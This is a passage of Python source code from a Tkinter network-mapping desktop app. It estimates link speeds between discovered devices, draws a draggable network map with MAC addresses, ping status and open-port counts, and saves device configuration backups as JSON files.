                    subnet2 = ipaddress.IPv4Network(f"{ip2}/24", strict=False)
                    
                    if subnet1 == subnet2:
                        # Same subnet - try to detect actual link speed
                        connection_type = "Ethernet"
                        link_speed = "1 Gbps"  # Default assumption
                        
                        # Find the interface that has the local IP, then check if device IPs are on same interface
                        local_iface = None
                        try:
                            import psutil
                            for iface, addrs in net_if_addrs.items():
                                for addr in addrs:
                                    if addr.family == 2 and addr.address == local_ip:  # AF_INET
                                        local_iface = iface
                                        break
                                if local_iface:
                                    break
                        except:
                            pass
                        
                        # Check if either device IP is on the same interface as local IP
                        # (interfaces can have multiple IPs, so check all IPs on the interface)
                        device_on_same_iface = False
                        if local_iface:
                            try:
                                for addr in net_if_addrs.get(local_iface, []):
                                    if addr.family == 2:  # AF_INET
                                        # Check if device IPs are in the same subnet as any IP on this interface
                                        try:
                                            import ipaddress
                                            iface_net = ipaddress.IPv4Network(f"{addr.address}/24", strict=False)
                                            if (ipaddress.IPv4Address(device1.ip) in iface_net or 
                                                ipaddress.IPv4Address(device2.ip) in iface_net):
                                                device_on_same_iface = True
                                                break
                                        except:
                                            pass
                            except:
                                pass
                        
                        # If devices are on same interface as local IP, or if local IP matches a device IP
                        if local_iface and (device_on_same_iface or device1.ip == local_ip or device2.ip == local_ip):
                            # Get speed from the local interface
                            if local_iface in net_if_stats:
                                stats = net_if_stats[local_iface]
                                if stats.isup and stats.speed > 0:
                                    if stats.speed == 2500:
                                        link_speed = "2.5 Gbps"
                                    elif stats.speed == 5000:
                                        link_speed = "5 Gbps"
                                    elif stats.speed >= 10000:
                                        link_speed = f"{stats.speed // 1000} Gbps"
                                    elif stats.speed >= 1000:
                                        link_speed = f"{stats.speed / 1000:.1f} Gbps"
                                    else:
                                        link_speed = f"{stats.speed} Mbps"
                                else:
                                    # Interface not up, use highest speed as fallback
                                    max_speed = 0
                                    for iface, s in net_if_stats.items():
                                        if s.isup and s.speed > max_speed:
                                            max_speed = s.speed
                                    
                                    if max_speed == 2500:
                                        link_speed = "2.5 Gbps"
                                    elif max_speed == 5000:
                                        link_speed = "5 Gbps"
                                    elif max_speed >= 10000:
                                        link_speed = f"{max_speed // 1000} Gbps"
                                    elif max_speed >= 1000:
                                        link_speed = f"{max_speed / 1000:.1f} Gbps"
                                    else:
                                        link_speed = f"{max_speed} Mbps"
                            else:
                                # Couldn't find interface stats, use highest speed
                                max_speed = 0
                                for iface, stats in net_if_stats.items():
                                    if stats.isup and stats.speed > max_speed:
                                        max_speed = stats.speed
                                
                                if max_speed == 2500:
                                    link_speed = "2.5 Gbps"
                                elif max_speed == 5000:
                                    link_speed = "5 Gbps"
                                elif max_speed >= 10000:
                                    link_speed = f"{max_speed // 1000} Gbps"
                                elif max_speed >= 1000:
                                    link_speed = f"{max_speed / 1000:.1f} Gbps"
                                else:
                                    link_speed = f"{max_speed} Mbps"
                        else:
                            # Devices not on same interface, try to find interface that matches device subnet
                            # or use highest speed as fallback
                            max_speed = 0
                            for iface, stats in net_if_stats.items():
                                if stats.isup and stats.speed > max_speed:
                                    max_speed = stats.speed
                            
                            if max_speed == 2500:
                                link_speed = "2.5 Gbps"
                            elif max_speed == 5000:
                                link_speed = "5 Gbps"
                            elif max_speed >= 10000:
                                link_speed = f"{max_speed // 1000} Gbps"
                            elif max_speed >= 1000:
                                link_speed = f"{max_speed / 1000:.1f} Gbps"
                            else:
                                link_speed = f"{max_speed} Mbps" if max_speed > 0 else "1 Gbps"
                    else:
                        # Different subnets - routed connection
                        link_speed = "Variable"
                        connection_type = "Routed"
                    
                    # Store connection
                    key = tuple(sorted([device1.ip, device2.ip]))
                    self.network_connections[key] = {
                        'speed': link_speed,
                        'type': connection_type,
                        'device1': device1,
                        'device2': device2
                    }
                except:
                    pass
        
        messagebox.showinfo("Connections Detected", 
                          f"Detected {len(self.network_connections)} connections between devices.")
    
    def generate_network_map(self):
        """Generate visual network map."""
        if not self.devices:
            messagebox.showinfo("No Devices", "Please scan the network first to discover devices.")
            return
        
        # Auto-detect connections if not already detected
        if not self.network_connections:
            self.map_info_label.config(text="Detecting connections...")
            self.network_canvas.update_idletasks()
            # Detect connections silently (without messagebox)
            devices_list = list(self.devices.values())
            
            # Get local network interface info
            try:
                import psutil
                net_if_stats = psutil.net_if_stats()
            except ImportError:
                net_if_stats = {}
            
            # Get local device IP
            local_ip = None
            try:
                import socket
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                local_ip = s.getsockname()[0]
                s.close()
            except:
                pass
            
            # Detect connections
            for i, device1 in enumerate(devices_list):
                for device2 in devices_list[i+1:]:
                    try:
                        import ipaddress
                        ip1 = ipaddress.IPv4Address(device1.ip)
                        ip2 = ipaddress.IPv4Address(device2.ip)
                        
                        subnet1 = ipaddress.IPv4Network(f"{ip1}/24", strict=False)
                        subnet2 = ipaddress.IPv4Network(f"{ip2}/24", strict=False)
                        
                        if subnet1 == subnet2:
                            connection_type = "Ethernet"
                            link_speed = "1 Gbps"  # Default assumption
                            
                            # Find the interface that has the local IP, then check if device IPs are on same interface
                            local_iface = None
                            try:
                                import psutil
                                net_if_addrs = psutil.net_if_addrs()
                                for iface, addrs in net_if_addrs.items():
                                    for addr in addrs:
                                        if addr.family == 2 and addr.address == local_ip:  # AF_INET
                                            local_iface = iface
                                            break
                                    if local_iface:
                                        break
                            except:
                                pass
                            
                            # Check if either device IP is on the same interface as local IP
                            # (interfaces can have multiple IPs, so check all IPs on the interface)
                            device_on_same_iface = False
                            if local_iface and net_if_addrs:
                                try:
                                    for addr in net_if_addrs.get(local_iface, []):
                                        if addr.family == 2:  # AF_INET
                                            # Check if device IPs are in the same subnet as any IP on this interface
                                            try:
                                                import ipaddress
                                                iface_net = ipaddress.IPv4Network(f"{addr.address}/24", strict=False)
                                                if (ipaddress.IPv4Address(device1.ip) in iface_net or 
                                                    ipaddress.IPv4Address(device2.ip) in iface_net):
                                                    device_on_same_iface = True
                                                    break
                                            except:
                                                pass
                                except:
                                    pass
                            
                            # If devices are on same interface as local IP, or if local IP matches a device IP
                            if local_iface and (device_on_same_iface or device1.ip == local_ip or device2.ip == local_ip):
                                # Get speed from the local interface
                                if local_iface in net_if_stats:
                                    stats = net_if_stats[local_iface]
                                    if stats.isup and stats.speed > 0:
                                        if stats.speed == 2500:
                                            link_speed = "2.5 Gbps"
                                        elif stats.speed == 5000:
                                            link_speed = "5 Gbps"
                                        elif stats.speed >= 10000:
                                            link_speed = f"{stats.speed // 1000} Gbps"
                                        elif stats.speed >= 1000:
                                            link_speed = f"{stats.speed / 1000:.1f} Gbps"
                                        else:
                                            link_speed = f"{stats.speed} Mbps"
                                    else:
                                        # Interface not up, use highest speed as fallback
                                        max_speed = 0
                                        for iface, s in net_if_stats.items():
                                            if s.isup and s.speed > max_speed:
                                                max_speed = s.speed
                                        
                                        if max_speed == 2500:
                                            link_speed = "2.5 Gbps"
                                        elif max_speed == 5000:
                                            link_speed = "5 Gbps"
                                        elif max_speed >= 10000:
                                            link_speed = f"{max_speed // 1000} Gbps"
                                        elif max_speed >= 1000:
                                            link_speed = f"{max_speed / 1000:.1f} Gbps"
                                        else:
                                            link_speed = f"{max_speed} Mbps"
                                else:
                                    # Couldn't find interface stats, use highest speed
                                    max_speed = 0
                                    for iface, stats in net_if_stats.items():
                                        if stats.isup and stats.speed > max_speed:
                                            max_speed = stats.speed
                                    
                                    if max_speed == 2500:
                                        link_speed = "2.5 Gbps"
                                    elif max_speed == 5000:
                                        link_speed = "5 Gbps"
                                    elif max_speed >= 10000:
                                        link_speed = f"{max_speed // 1000} Gbps"
                                    elif max_speed >= 1000:
                                        link_speed = f"{max_speed / 1000:.1f} Gbps"
                                    else:
                                        link_speed = f"{max_speed} Mbps"
                            else:
                                # Devices not on same interface, use highest speed as fallback
                                max_speed = 0
                                for iface, stats in net_if_stats.items():
                                    if stats.isup and stats.speed > max_speed:
                                        max_speed = stats.speed
                                
                                if max_speed == 2500:
                                    link_speed = "2.5 Gbps"
                                elif max_speed == 5000:
                                    link_speed = "5 Gbps"
                                elif max_speed >= 10000:
                                    link_speed = f"{max_speed // 1000} Gbps"
                                elif max_speed >= 1000:
                                    link_speed = f"{max_speed / 1000:.1f} Gbps"
                                else:
                                    link_speed = f"{max_speed} Mbps" if max_speed > 0 else "1 Gbps"
                        else:
                            link_speed = "Variable"
                            connection_type = "Routed"
                        
                        key = tuple(sorted([device1.ip, device2.ip]))
                        self.network_connections[key] = {
                            'speed': link_speed,
                            'type': connection_type,
                            'device1': device1,
                            'device2': device2
                        }
                    except:
                        pass
        
        # Clear canvas completely
        self.network_canvas.delete("all")
        self.map_info_label.config(text=f"Mapping {len(self.devices)} devices...")
        
        # Update the canvas to ensure it's ready
        self.network_canvas.update_idletasks()
        
        # Improved layout - try to group by subnet
        devices_list = list(self.devices.values())
        
        # Group devices by subnet
        subnets = {}
        for device in devices_list:
            try:
                import ipaddress
                ip = ipaddress.IPv4Address(device.ip)
                subnet = ipaddress.IPv4Network(f"{ip}/24", strict=False)
                subnet_str = str(subnet)
                if subnet_str not in subnets:
                    subnets[subnet_str] = []
                subnets[subnet_str].append(device)
            except:
                # Fallback for devices without valid IP
                if "unknown" not in subnets:
                    subnets["unknown"] = []
                subnets["unknown"].append(device)
        
        # Calculate layout
        device_positions = {}
        # Increased spacing to 320 to spread boxes out more and make it look nicer
        spacing = 320
        start_x = 180
        start_y = 180
        
        # Position devices, grouping by subnet
        y_offset = start_y
        max_per_row = 5
        
        for subnet_str, subnet_devices in subnets.items():
            x_offset = start_x
            row_count = 0
            
            for device in subnet_devices:
                # Ensure we have a valid IP for positioning
                if device.ip and device.ip not in device_positions:
                    device_positions[device.ip] = (x_offset, y_offset)
                    x_offset += spacing
                    row_count += 1
                    
                    # Move to next row if we've reached max per row
                    if row_count >= max_per_row:
                        x_offset = start_x
                        y_offset += spacing
                        row_count = 0
            
            # Add space between subnets
            y_offset += spacing * 1.5
        
        # Fallback: if no devices got positioned, use simple grid
        if not device_positions:
            # Simple grid layout as fallback
            cols = int(len(devices_list) ** 0.5) + 1
            for idx, device in enumerate(devices_list):
                if device.ip:
                    row = idx // cols
                    col = idx % cols
                    x = start_x + col * spacing
                    y = start_y + row * spacing
                    device_positions[device.ip] = (x, y)
        
        # Store connection info for drawing after devices are positioned
        connections_to_draw = []
        if self.show_connections.get() and self.network_connections:
            for (ip1, ip2), conn_info in self.network_connections.items():
                connections_to_draw.append((ip1, ip2, conn_info))
        
        # Draw devices - ensure all devices are drawn
        devices_drawn = 0
        max_per_row = 5
        
        for device in devices_list:
            if not device.ip:
                continue
                
            # Get position, or assign one if missing
            if device.ip not in device_positions:
                # Assign a default position - use consistent spacing
                devices_drawn += 1
                x = start_x + ((devices_drawn - 1) % max_per_row) * spacing
                y = start_y + ((devices_drawn - 1) // max_per_row) * spacing
                device_positions[device.ip] = (x, y)
            
            x, y = device_positions[device.ip]
            devices_drawn += 1
            
            # Ensure device position is stored in self.device_positions for dragging
            self.device_positions[device.ip] = (x, y)
            
            try:
                # Draw device box - make it wider to fit all info better
                # Increased to 220x130 to accommodate longer device names and full MAC addresses
                box_width = 220
                box_height = 130
                # Create device box with tag for dragging
                device_tag = f"device_{device.ip}"
                box_id = self.network_canvas.create_rectangle(x-box_width//2, y-box_height//2, 
                                                             x+box_width//2, y+box_height//2, 
                                                             fill="#E8E8E8", outline="#333", width=2,
                                                             tags=("device", device_tag))
                
                # Store device position for dragging
                self.device_positions[device.ip] = (x, y)
                
                # Device label - allow longer names, truncate intelligently
                label = device.get_display_name() if device.get_display_name() else device.ip
                # Truncate if too long, but try to preserve meaningful parts
                if len(label) > 28:
                    label = label[:25] + "..."
                device_tag = f"device_{device.ip}"
                self.network_canvas.create_text(x, y-50, text=label, font=("Segoe UI", 10, "bold"),
                                                tags=("device", device_tag), width=box_width-20)
                self.network_canvas.create_text(x, y-30, text=device.ip, font=("Consolas", 9),
                                                tags=("device", device_tag))
                
                # MAC address - always try to get and display it
                mac_display = None
                # First check if device already has MAC
                if device.mac and device.mac != "Unknown":
                    mac_display = device.mac
                else:
                    # Try to get MAC address from ARP table
                    try:
                        mac = self.scanner.get_mac_address(device.ip)
                        if mac and mac != "Unknown":
                            device.mac = mac
                            mac_display = mac
                            # Update device in storage
                            self.storage.save_device(device)
                    except Exception as e:
                        # If get_mac_address fails, try ARP table lookup directly
                        try:
                            import subprocess
                            import platform
                            if platform.system() == "Linux":
                                result = subprocess.run(['arp', '-n', device.ip], 
                                                      capture_output=True, text=True, timeout=2)
                                if result.returncode == 0 and result.stdout:
                                    # Parse ARP output: format is "IP (MAC) at ..."
                                    for line in result.stdout.split('\n'):
                                        if device.ip in line:
                                            parts = line.split()
                                            for part in parts:
                                                if ':' in part and len(part) == 17:
                                                    device.mac = part
                                                    mac_display = part
                                                    self.storage.save_device(device)
                                                    break
                                            if mac_display:
                                                break
                        except:
                            pass
                
                # Always display MAC address (or "Unknown" if we couldn't get it)
                if not mac_display:
                    mac_display = "Unknown"
                if len(mac_display) <= 17:
                    mac_text = mac_display
                else:
                    mac_text = mac_display[:14] + "..."
                device_tag = f"device_{device.ip}"
                self.network_canvas.create_text(x, y-10, text=mac_text, font=("Consolas", 8),
                                                fill="#666666", tags=("device", device_tag))
                
                # Status indicator - make it more visible and check device status
                # Check if device is actually online by pinging it (with timeout to not block)
                is_online = False
                try:
                    is_online = self.scanner.ping_host(device.ip, timeout=0.3)
                    device.status = "Online" if is_online else "Offline"
                except Exception as e:
                    # If ping fails, use existing status or default to offline
                    is_online = (device.status == "Online")
                    if not device.status or device.status == "Unknown":
                        is_online = False
                        device.status = "Offline"
                
                # Draw larger, more visible status indicator in top-right corner
                # Position: device box is now x-110 to x+110, y-65 to y+65
                # Top-right corner is x+110, y-65
                status_color = "#00AA00" if is_online else "#CC0000"
                status_x = x + 95  # 15 pixels from right edge
                status_y = y - 55  # 10 pixels from top edge
                # Draw a larger circle with white border for visibility
                device_tag = f"device_{device.ip}"
                status_circle = self.network_canvas.create_oval(
                    status_x - 8, status_y - 8, status_x + 8, status_y + 8, 
                    fill=status_color, outline="#FFFFFF", width=2,
                    tags=("device", device_tag)
                )
                # Ensure status circle is on top
                self.network_canvas.tag_raise(status_circle)
                
                # Show open ports count if available
                port_y = y + 15
                device_tag = f"device_{device.ip}"
                if device.open_ports:
                    port_text = f"{len(device.open_ports)} ports"
                    self.network_canvas.create_text(x, port_y, text=port_text, font=("Segoe UI", 8),
                                                    fill="#0066CC", tags=("device", device_tag))
                    port_y += 18  # Move down for status text
                else:
                    port_y += 5  # If no ports, still position status text
                
                # Add text status label under the ports (inside the box)
                status_text = "● Online" if is_online else "● Offline"
                status_text_color = "#00AA00" if is_online else "#CC0000"
                device_tag = f"device_{device.ip}"
                status_text_id = self.network_canvas.create_text(
                    x, port_y, text=status_text, 
                    font=("Segoe UI", 8, "bold"),
                    fill=status_text_color, tags=("device", device_tag)
                )
                # Ensure status text is visible
                self.network_canvas.tag_raise(status_text_id)
            except Exception as e:
                # If drawing fails for one device, continue with others
                print(f"Error drawing device {device.ip}: {e}")
                continue
        
        # Now draw connections (after all devices are drawn and positioned)
        # We need to move connections to the back layer so devices appear on top
        for ip1, ip2, conn_info in connections_to_draw:
            if ip1 in device_positions and ip2 in device_positions:
                x1, y1 = device_positions[ip1]
                x2, y2 = device_positions[ip2]
                
                # Draw connection line
                line_color = "#0066CC" if conn_info['type'] == "Ethernet" else "#888888"
                line_width = 2 if "Gbps" in conn_info['speed'] else 1
                
                line_id = self.network_canvas.create_line(x1, y1, x2, y2, 
                                                        fill=line_color, width=line_width, 
                                                        tags="connection", 
                                                        dash=(5, 5) if conn_info['type'] == "Routed" else ())
                
                # Move line to back (behind devices)
                self.network_canvas.tag_lower("connection")
                
                # Always draw link speed label at midpoint (make it more visible)
                mid_x = (x1 + x2) / 2
                mid_y = (y1 + y2) / 2
                speed_text = conn_info['speed']
                
                # Estimate text size for background (approximate)
                # Most speed texts are like "1 Gbps" or "100 Mbps" - about 50-60 pixels wide
                text_width = len(speed_text) * 6  # Approximate 6 pixels per character
                text_height = 12
                padding = 4
                
                # Draw background rectangle for better visibility
                bg_rect = self.network_canvas.create_rectangle(
                    mid_x - text_width/2 - padding, mid_y - text_height/2 - padding,
                    mid_x + text_width/2 + padding, mid_y + text_height/2 + padding,
                    fill="white", outline=line_color, width=1, tags="speed_label"
                )
                # Move background behind text but above connection line
                self.network_canvas.tag_raise(bg_rect, "connection")
                
                # Draw speed text on top
                self.network_canvas.create_text(mid_x, mid_y, text=speed_text, 
                                                font=("Segoe UI", 8, "bold"), 
                                                fill=line_color,
                                                tags="speed_label")
        
        # Legend is now displayed in the Mapping Controls section, not on the canvas
        
        # Update device positions dictionary after drawing
        for device in devices_list:
            if device.ip in device_positions:
                self.device_positions[device.ip] = device_positions[device.ip]
        
        # Update scroll region to include all devices
        self.update_scroll_region()
        
        conn_count = len(self.network_connections) if self.network_connections else 0
        self.map_info_label.config(text=f"Network map: {devices_drawn} devices displayed, {conn_count} connections")
    
    def refresh_network_map(self):
        """Refresh the network map."""
        # Re-detect connections if needed, then regenerate map
        if not self.network_connections:
            # Auto-detect connections if not already done
            self.detect_network_connections()
        self.generate_network_map()
    
    def on_canvas_click(self, event):
        """Handle mouse click on canvas - check if clicking on a device."""
        device_ip = None
        
        # Convert canvas coordinates (accounting for scrolling)
        canvas_x = self.network_canvas.canvasx(event.x)
        canvas_y = self.network_canvas.canvasy(event.y)
        
        # First check if click is within any device box bounds (most reliable)
        # Check all devices to find which one was clicked - check ALL devices regardless of position
        for ip, (x, y) in self.device_positions.items():
            # Device box is 220x130, so check if click is within bounds
            # Account for box center at (x, y) with width 220 and height 130
            if (abs(canvas_x - x) <= 110 and abs(canvas_y - y) <= 65):
                device_ip = ip
                break
        
        # Also check tags as fallback (in case click is on text/label)
        if not device_ip:
            # Use canvas coordinates for find_closest
            clicked_items = self.network_canvas.find_closest(canvas_x, canvas_y)
            if clicked_items:
                item = clicked_items[0]
                tags = self.network_canvas.gettags(item)
                
                # Check if this is a device element
                for tag in tags:
                    if tag.startswith("device_"):
                        device_ip = tag.replace("device_", "")
                        break
        
        # If we found a device, start dragging
        if device_ip and device_ip in self.device_positions:
            self.dragged_device = device_ip
            self.drag_start_pos = (canvas_x, canvas_y)
            # Change cursor to indicate dragging
            self.network_canvas.config(cursor="hand2")
            # Store initial device position for reference
            self.initial_drag_pos = self.device_positions[device_ip]
    
    def on_canvas_drag(self, event):
        """Handle mouse drag - move device if one is being dragged."""
        if self.dragged_device and self.drag_start_pos:
            # Convert canvas coordinates (accounting for scrolling)
            canvas_x = self.network_canvas.canvasx(event.x)
            canvas_y = self.network_canvas.canvasy(event.y)
            
            # Calculate total movement from initial click position
            if hasattr(self, 'initial_drag_pos'):
                initial_x, initial_y = self.initial_drag_pos
                # Calculate where device should be now using canvas coordinates
                new_x = initial_x + (canvas_x - self.drag_start_pos[0])
                new_y = initial_y + (canvas_y - self.drag_start_pos[1])
                
                # Get current position
                if self.dragged_device in self.device_positions:
                    old_x, old_y = self.device_positions[self.dragged_device]
                    # Calculate delta
                    dx = new_x - old_x
                    dy = new_y - old_y
                    
                    # Only move if there's actual movement
                    if abs(dx) > 0 or abs(dy) > 0:
                        # Move all elements with this device's tag
                        device_tag = f"device_{self.dragged_device}"
                        self.network_canvas.move(device_tag, dx, dy)
                        
                        # Update stored position
                        self.device_positions[self.dragged_device] = (new_x, new_y)
                        
                        # Redraw connections more frequently for smoother updates (every 30ms)
                        import time
                        current_time = time.time() * 1000  # Convert to milliseconds
                        if current_time - self.last_redraw_time > 30:
                            # Redraw connections for this device
                            self.redraw_connections_for_device(self.dragged_device)
                            self.last_redraw_time = current_time
                            # Update scroll region to include new positions
                            self.update_scroll_region()
            else:
                # Fallback to incremental movement using canvas coordinates
                dx = canvas_x - self.drag_start_pos[0]
                dy = canvas_y - self.drag_start_pos[1]
                
                if abs(dx) > 0 or abs(dy) > 0:
                    device_tag = f"device_{self.dragged_device}"
                    self.network_canvas.move(device_tag, dx, dy)
                    
                    if self.dragged_device in self.device_positions:
                        old_x, old_y = self.device_positions[self.dragged_device]
                        self.device_positions[self.dragged_device] = (old_x + dx, old_y + dy)
                    
                    self.drag_start_pos = (canvas_x, canvas_y)
                    
                    import time
                    current_time = time.time() * 1000
                    if current_time - self.last_redraw_time > 30:
                        self.redraw_connections_for_device(self.dragged_device)
                        self.last_redraw_time = current_time
                        self.update_scroll_region()
    
    def on_canvas_release(self, event):
        """Handle mouse release - stop dragging."""
        if self.dragged_device:
            # Final redraw to ensure connections are correct
            self.redraw_connections_for_device(self.dragged_device)
            # Update scroll region after final position
            self.update_scroll_region()
            self.dragged_device = None
            self.drag_start_pos = None
            self.network_canvas.config(cursor="")
            self.last_redraw_time = 0
    
    def redraw_connections_for_device(self, device_ip):
        """Redraw connections for a specific device after it's moved."""
        if not self.show_connections.get() or not self.network_connections:
            return
        
        # Find all connections involving this device
        connections_to_redraw = []
        connection_keys = set()
        for (ip1, ip2), conn_info in self.network_connections.items():
            if ip1 == device_ip or ip2 == device_ip:
                connections_to_redraw.append((ip1, ip2, conn_info))
                connection_keys.add(tuple(sorted([ip1, ip2])))
        
        # Delete ALL connection lines and speed labels first (prevents accumulation)
        # Use a more aggressive approach - delete by tag
        all_connections = list(self.network_canvas.find_withtag("connection"))
        all_speed_labels = list(self.network_canvas.find_withtag("speed_label"))
        
        # Delete all connections and labels
        for item in all_connections:
            self.network_canvas.delete(item)
        for item in all_speed_labels:
            self.network_canvas.delete(item)
        
        # Now redraw ALL connections (ensures consistency and prevents duplicates)
        for (ip1, ip2), conn_info in self.network_connections.items():
            if ip1 in self.device_positions and ip2 in self.device_positions:
                x1, y1 = self.device_positions[ip1]
                x2, y2 = self.device_positions[ip2]
                
                # Draw connection line
                line_color = "#0066CC" if conn_info['type'] == "Ethernet" else "#888888"
                line_width = 2 if "Gbps" in conn_info['speed'] else 1
                
                line_id = self.network_canvas.create_line(x1, y1, x2, y2, 
                                                        fill=line_color, width=line_width, 
                                                        tags="connection", 
                                                        dash=(5, 5) if conn_info['type'] == "Routed" else ())
                
                # Move line to back
                self.network_canvas.tag_lower("connection")
                
                # Draw speed label
                mid_x = (x1 + x2) / 2
                mid_y = (y1 + y2) / 2
                speed_text = conn_info['speed']
                
                text_width = len(speed_text) * 6
                text_height = 12
                padding = 4
                
                bg_rect = self.network_canvas.create_rectangle(
                    mid_x - text_width/2 - padding, mid_y - text_height/2 - padding,
                    mid_x + text_width/2 + padding, mid_y + text_height/2 + padding,
                    fill="white", outline=line_color, width=1, tags="speed_label"
                )
                self.network_canvas.tag_raise(bg_rect, "connection")
                
                self.network_canvas.create_text(mid_x, mid_y, text=speed_text, 
                                                font=("Segoe UI", 8, "bold"), 
                                                fill=line_color,
                                                tags="speed_label")
    
    def update_scroll_region(self):
        """Update the scrollable region to include all devices and connections."""
        try:
            # Get bounding box of all items
            bbox = self.network_canvas.bbox("all")
            if bbox:
                # Add padding and ensure minimum size
                padding = 100
                min_width = 2000
                min_height = 2000
                scroll_width = max(bbox[2] - bbox[0] + padding * 2, min_width)
                scroll_height = max(bbox[3] - bbox[1] + padding * 2, min_height)
                
                # Also check device positions to ensure they're included
                if self.device_positions:
                    min_x = min(pos[0] for pos in self.device_positions.values()) - 150
                    max_x = max(pos[0] for pos in self.device_positions.values()) + 150
                    min_y = min(pos[1] for pos in self.device_positions.values()) - 100
                    max_y = max(pos[1] for pos in self.device_positions.values()) + 100
                    
                    scroll_width = max(scroll_width, max_x - min_x + padding * 2)
                    scroll_height = max(scroll_height, max_y - min_y + padding * 2)
                
                self.network_canvas.config(scrollregion=(
                    bbox[0] - padding, bbox[1] - padding,
                    bbox[0] - padding + scroll_width, bbox[1] - padding + scroll_height
                ))
            else:
                # Fallback: use device positions or default size
                if self.device_positions:
                    min_x = min(pos[0] for pos in self.device_positions.values()) - 200
                    max_x = max(pos[0] for pos in self.device_positions.values()) + 200
                    min_y = min(pos[1] for pos in self.device_positions.values()) - 150
                    max_y = max(pos[1] for pos in self.device_positions.values()) + 150
                    
                    self.network_canvas.config(scrollregion=(min_x, min_y, max_x, max_y))
                else:
                    self.network_canvas.config(scrollregion=(0, 0, 2000, 2000))
        except:
            # Ultimate fallback
            self.network_canvas.config(scrollregion=(0, 0, 3000, 3000))
    
    def create_config_management_tab(self, parent):
        """Create the Configuration Management tab."""
        # Control frame
        control_frame = ttk.LabelFrame(parent, text="Configuration Management", padding="10")
        control_frame.pack(fill=tk.X, pady=(0, 10))
        
        # Device selection
        device_frame = ttk.Frame(control_frame)
        device_frame.pack(fill=tk.X, pady=(0, 10))
        
        ttk.Label(device_frame, text="Device:", font=("Segoe UI", 9)).pack(side=tk.LEFT, padx=(0, 5))
        self.config_device_var = tk.StringVar()
        device_combo = ttk.Combobox(device_frame, textvariable=self.config_device_var, 
                                   values=[], state="readonly", width=30)
        device_combo.pack(side=tk.LEFT, padx=(0, 10))
        self.config_device_combo = device_combo
        
        # Bind event to update config display when device is selected
        device_combo.bind('<<ComboboxSelected>>', lambda e: self.update_config_display())
        
        ttk.Button(device_frame, text="Refresh Device List", 
                  command=self.refresh_config_device_list).pack(side=tk.LEFT)
        
        # Action buttons
        action_frame = ttk.Frame(control_frame)
        action_frame.pack(fill=tk.X)
        
        ttk.Button(action_frame, text="Backup Configuration", 
                  command=self.backup_device_config).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(action_frame, text="View Config History", 
                  command=self.view_config_history).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(action_frame, text="Restore Configuration", 
                  command=self.restore_device_config).pack(side=tk.LEFT)
        
        # Configuration display
        config_display_frame = ttk.LabelFrame(parent, text="Configuration Details", padding="10")
        config_display_frame.pack(fill=tk.BOTH, expand=True)
        
        self.config_text = scrolledtext.ScrolledText(config_display_frame, wrap=tk.WORD, 
                                                     font=("Consolas", 9), height=20, state="disabled")
        self.config_text.pack(fill=tk.BOTH, expand=True)
        
        # Config history list
        history_frame = ttk.LabelFrame(parent, text="Configuration History", padding="10")
        history_frame.pack(fill=tk.BOTH, expand=True)
        
        columns = ('Timestamp', 'Device', 'Action', 'Size')
        self.config_history_tree = ttk.Treeview(history_frame, columns=columns, show='headings', height=8)
        
        for col in columns:
            self.config_history_tree.heading(col, text=col)
            self.config_history_tree.column(col, width=150)
        
        self.config_history_tree.pack(fill=tk.BOTH, expand=True)
        
        # Initialize device list and config history
        self.refresh_config_device_list()
        self.view_config_history()
    
    def refresh_config_device_list(self):
        """Refresh device list for config management."""
        devices = [f"{d.ip} - {d.get_display_name()}" for d in self.devices.values()]
        self.config_device_combo['values'] = devices
        if devices:
            self.config_device_combo.current(0)
            # Update config display for the selected device
            self.update_config_display()
        else:
            # Clear config display if no devices
            self.config_text.config(state="normal")
            self.config_text.delete(1.0, tk.END)
            self.config_text.insert(1.0, "No devices available. Please scan your network first.")
            self.config_text.config(state="disabled")
    
    def update_config_display(self):
        """Update the configuration display with the selected device's configuration."""
        device_str = self.config_device_var.get()
        if not device_str:
            self.config_text.config(state="normal")
            self.config_text.delete(1.0, tk.END)
            self.config_text.insert(1.0, "No device selected.")
            self.config_text.config(state="disabled")
            return
        
        ip = device_str.split(' - ')[0]
        device = self.devices.get(ip)
        
        if not device:
            self.config_text.config(state="normal")
            self.config_text.delete(1.0, tk.END)
            self.config_text.insert(1.0, f"Device {ip} not found.")
            self.config_text.config(state="disabled")
            return
        
        # Format configuration as JSON
        import json
        config_data = {
            'ip': device.ip,
            'mac': device.mac,
            'hostname': device.hostname,
            'vendor': device.vendor,
            'status': device.status,
            'subnet_mask': device.subnet_mask,
            'custom_label': device.custom_label,
            'open_ports': device.open_ports,
            'os_info': device.os_info,
            'last_seen': time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(device.last_seen)) if device.last_seen > 0 else 'Never'
        }
        
        config_json = json.dumps(config_data, indent=2)
        
        self.config_text.config(state="normal")
        self.config_text.delete(1.0, tk.END)
        self.config_text.insert(1.0, config_json)
        self.config_text.config(state="disabled")
    
    def backup_device_config(self):
        """Backup device configuration."""
        device_str = self.config_device_var.get()
        if not device_str:
            messagebox.showwarning("No Device", "Please select a device.")
            return
        
        ip = device_str.split(' - ')[0]
        device = self.devices.get(ip)
        
        if not device:
            messagebox.showerror("Error", "Device not found.")
            return
        
        # Create backup
        import json
        from datetime import datetime
        
        backup_data = {
            'ip': device.ip,
            'mac': device.mac,
            'hostname': device.hostname,
            'label': device.custom_label,
            'vendor': device.vendor,
            'ports': device.open_ports,
            'subnet_mask': device.subnet_mask,
            'os_info': device.os_info,
            'status': device.status,
            'timestamp': datetime.now().isoformat()
        }
        
        # Use the same config directory as device storage
        if os.name == 'nt':  # Windows
            backup_dir = os.path.join(os.getenv('APPDATA', ''), 'YaP-Network-Scanner', 'backups')
        else:  # Linux/Mac
            backup_dir = os.path.join(os.path.expanduser('~'), '.config', 'yap-network-scanner', 'backups')
        os.makedirs(backup_dir, exist_ok=True)
        
        filename = f"{ip}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        filepath = os.path.join(backup_dir, filename)
        
        try:
            with open(filepath, 'w') as f:
                json.dump(backup_data, f, indent=2)
            messagebox.showinfo("Success", f"Configuration backed up to:\n{filepath}")
            self.view_config_history()
        except Exception as e:
            messagebox.showerror("Error", f"Failed to backup: {str(e)}")
    
    def view_config_history(self):
        """View configuration history."""
        # Use the same config directory as device storage
        if os.name == 'nt':  # Windows
            backup_dir = os.path.join(os.getenv('APPDATA', ''), 'YaP-Network-Scanner', 'backups')
        else:  # Linux/Mac
